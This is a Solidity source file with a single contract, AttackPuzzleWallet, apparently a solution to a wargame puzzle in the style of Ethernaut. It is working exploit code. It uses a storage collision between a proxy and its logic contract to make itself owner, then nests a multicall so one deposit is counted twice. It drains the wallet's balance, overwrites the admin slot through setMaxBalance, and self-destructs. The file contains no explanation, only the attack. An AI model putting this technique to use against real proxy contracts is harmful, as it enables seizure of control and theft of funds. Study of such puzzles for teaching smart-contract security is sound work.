// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address) external;
    function addToWhitelist(address) external;
    function setMaxBalance(uint256) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable;
}

contract AttackPuzzleWallet {
    constructor(IWallet wallet) payable {
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory depositDataHackArray = new bytes[](1);
        depositDataHackArray[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = depositDataHackArray[0];
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, depositDataHackArray);

        wallet.multicall{value: 0.001 ether}(data);
        wallet.execute(msg.sender, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender, "Failed to take over wallet");
        selfdestruct(payable(msg.sender));
    }
}
